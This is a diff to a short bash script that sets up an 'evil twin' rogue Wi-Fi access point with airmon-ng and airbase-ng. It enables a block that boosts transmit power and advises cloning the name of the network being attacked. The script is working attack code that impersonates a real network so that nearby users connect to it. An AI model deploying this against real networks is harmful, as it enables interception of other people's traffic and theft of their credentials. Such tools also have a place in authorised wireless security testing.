@@ -2,12 +2,6 @@
 
 # this script sets up the evil twin access point
 
-# WLAN=wlan1			# monitor mode wirless adapter
-# MON=mon
-# WLANMON=$WLAN$MON
-# ESSID=zzzz
-# CHANNEL=6
-
 CONFIG="eviltwin.config"
 if test -f $CONFIG ; then
 	source $CONFIG
@@ -24,12 +18,12 @@ echo -e "Creating $WLAN monitor interface"
 airmon-ng start $WLAN
 
 # boost signal strength to max legal limit in the US, 30 dBm
-# echo -e "Boosting Signal Strength"
-# ifconfig $WLANMON down     
-# iw reg set US              
-# ifconfig $WLANMON up 
+echo -e "Boosting Signal Strength"
+ifconfig $WLANMON down     
+iw reg set US              
+ifconfig $WLANMON up 
 
 # start up the evil twin AP (access point)
-# 	Give the evil twin the same name as the network you are attacking for best results
+# Give the evil twin the same name as the network you are attacking for best results
 echo -e "Starting evil twin"
 airbase-ng -e $ESSID -c $CHANNEL $WLANMON
